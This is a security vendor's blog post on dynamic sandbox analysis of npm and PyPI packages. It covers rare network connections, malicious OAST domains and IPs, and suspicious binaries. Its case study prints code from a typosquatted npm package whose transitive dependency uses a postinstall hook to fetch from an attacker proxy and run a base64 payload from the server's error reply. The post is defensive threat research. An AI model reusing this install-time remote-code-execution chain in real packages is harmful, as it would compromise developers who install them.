---
publishDate: 2025-05-19T00:00:00Z
title: 'Digging into Dynamic Malware Analysis Signals'
image: /images/dynamic-singals.png
excerpt: In this blog, we explore how analyzing run-time behaviors using Dynamic Analyzer data helps uncover abnormal activities in open-source packages. By examining rare network connections and unusual binary executions during package installation, we identify potential malicious actors and suspicious IP addresses. Leveraging tools like VirusTotal and reverse DNS lookups, we demonstrate effective techniques to detect threats early and enhance software supply chain security at scale.
author: SafeDep Team
tags:
  - dynamic-analysis
  - oss
  - malware
  - security
---

# Digging into Dynamic Malware Analysis Signals

We discussed our _Dynamic Malware Analyzer_ in the [blog post](/dynamic-analysis-oss-package-at-scale). Dynamic analyzer help in observing real, runtime behaviors and activities for a package, installed in a sandbox environment. Its complements our Static Analysis system and helps:

- To verify and correlate static analysis findings with actual runtime behavior
- To overcome the limitations of static analysis (which may have false positives and negatives)
- To observe how packages actually behave when executed in a controlled environment
- To identify malicious packages that might evade static code analysis
- To reduce the need for human intervention (manual analysis) over time

Since we started operating this infrastructure, we have already logged nearly `28` _Million_ events, analyzing more than `380,000` packages.

As events are aggregated in such large numbers, we need a way to find **abnormal** activity-in simple terms, we need a way to find the odd one out from the data to quickly spot any bad actors.

We have multiple `Aggregator` tables to store parts of data for efficient distribution analysis.  
Today we are going to see these aggregators:

- Network Connection, IP Aggregator
- Binary execution on install, External Binaries.


### Abnormal Network Connection

While a package is installed, it is bound to make some network connections, especially to `npm` and `pypi` registries, to name a few. But when they make extra connections, that’s something to notice. We log every *IP address* for these connections, and by analyzing the distribution of these *IP addresses*, we can spot anomalies.

You can see the distribution of `624` _IP addresses_, and their occurrence count (frequency) below:

<div className="dark:invert dark:brightness-90">
  ![Dynamic Analyzer IP Address Distribution](/images/ip_address.png)
</div>

We can clearly observe the fact that some connections occurred only 1 or 2 times. These connections are very interesting and can be potential malicious behavior. 

A few connections, their `IP` addresses are:

<div className="dark:invert dark:brightness-90">
  ![Dynamic Analyzer Malicious IP Address](/images/malicious-ip-address-table.png)
</div>

Using [VirusTotal](https://www.virustotal.com/) we can already see how IP `167.99.69.236` is classified as malicious by multiple sources.

<div className="dark:brightness-90">
  ![Dynamic Analyzer VirusTotal IP examples](/images/virustotal-ip.png)
</div>

It was time to do a `reverse DNS lookup` and find where these connections are going. Although not every IP address can be resolved to a host, due to many reasons, some of the hostname were:

<div className="dark:invert dark:brightness-90">
  ![Dynamic Analyzer Malicious Host examples](/images/malicious-host.png)
</div>

It’s clear from the data that hostname like `oast.online`, `oast.site`, `oast.live`, `mail.sms-system-alert.com` are very suspicious. `OAST` (Out-of-band application security testing) domains are especially suspicious and should not be included in any production application.

After analysis, all `oast.*` domains and `sms-system-alert.com` were found to be malicious, confirmed by `VirusTotal` with multiple sources. 

<div className="dark:brightness-90">
  <figure>
    <figcaption>sms-system-alert.com</figcaption>
    <img src="/images/sms-domain.png" alt="Dynamic Analyzer Malicious Host examples" style="width: 100%;" />
  </figure>
</div>

#### Case Study 

We backtrack the package which is associated with this event, making connection to this `45.11.59.250` IP (who's host was `mail.sms-system-alert.com`), and found [eslint-config-airbnb-compat](https://www.npmjs.com/package/eslint-config-airbnb-compat), this package appears to impersonate legitimate [eslint-config-airbnb](https://www.npmjs.com/package/eslint-config-airbnb)  possibly with the goal of starjacking and spoofing its origin to automated security tools.

We found, `eslint-config-airbnb-compat` contains a post install script to execute `setup.js`

```shell
"postinstall": "node ./setup",
```

However, to avoid identification, the `setup.js` does not have any malicious code. It simply does the following:

Copy the embedded `.env.example` to `.env`

```js
if (!fs.existsSync(".env")) {
  fs.copyFileSync(".env.example", ".env");
  process.env.APP_PATH=process.cwd();
}
```

The .env file contains the following

```txt
APP_ENV=local
APP_PROXY=https://proxy.eslint-proxy.site
APP_LOCAL=
ESLINT_DEBUG=true
FORCE_COLOR=1
```

Execute `npm install` if `node_modules` directory is not present


```js
if (!fs.existsSync("node_modules")) {
  run('npm install');
}
```

This may not appear as malicious but one of the transitive dependencies introduced by this package is `ts-runtime-compat-check`. This package in turn have a post install script:

```shell
"postinstall": "node lib/install.js"
```

The `lib/install.js` contains interesting code:

```js
const appPath = process.env.APP_PATH || 'http://localhost';
const proxy = process.env.APP_PROXY || 'http://localhost';

const response = await fetch(
  `${proxy}/api/v1/hb89/data?appPath=${appPath}`
);
```

When introduced through `eslint-config-airbnb-compat`, it will have `proxy=https://proxy.eslint-proxy.site` in the `fetch(..)` call above. The above fetch call is expected to fail to trigger `errorHandler` function with _remote server_ provided error message. 

```js
...
  if (!response.ok) {
      const apiError = await response.json();
      throw new Error(apiError.error);
    }
    await response.json();
  } catch (err) {
  errorHandler(err.message);
}
```

So the remote server at `https://proxy.eslint-proxy.site` can return a _JSON_ message such as `{"error": "<JS Payload>"}` which in turn will be passed to _errorHandler_ as an Error object.

The error handler in turn does the following:

- Decode the message as _base64_ string

```js
const decoded = Buffer.from(error, "base64").toString("utf-8");
```

- Constructs a function from the decoded string

```js
const handler = new Function.constructor("require", errCode);
```

- Finally executes the remote code

```js
const handlerFunc = createHandler(decoded);
if (handlerFunc) {
  handlerFunc(require);
} else {
  console.error("Handler function is not available.");
}
```

This pretty much confirm the malicious behavior of the entire attack chain. It implements a multi-stage remote code execution attack using transitive dependency. Hence bypassing any static analyzer, as each packages analyzed alone does not show any malicious pattern. 

### Abnormal Binary Execution

Packages introducing external binaries on installing is a common thing. For example, top binaries installed during installation and executed include `esbuild`, `workerd`, `rustc`, `cmake`, `ninja`, `zig`, and many more...

But, this behavior can be dangerous, as any malicious package can run any arbitrary binary which can lead to severe damage. Our `External Binary` distribution is:

<div className="dark:invert dark:brightness-90">
  ![Dynamic Analyzer External Binary Distribution](/images/external-binary.png)
</div>


You will see binaries like `bsc.exe`, `memcmp_invalid_`, `purs.bin`, `test_program`, etc. are very suspicious.  
They can be used to harm the system as soon as the package is installed.

## Conclusion

By analyzing low-frequency network connections and binary executions, we efficiently identify high-risk packages. Future work will correlate these signals with static analysis results to improve detection accuracy.
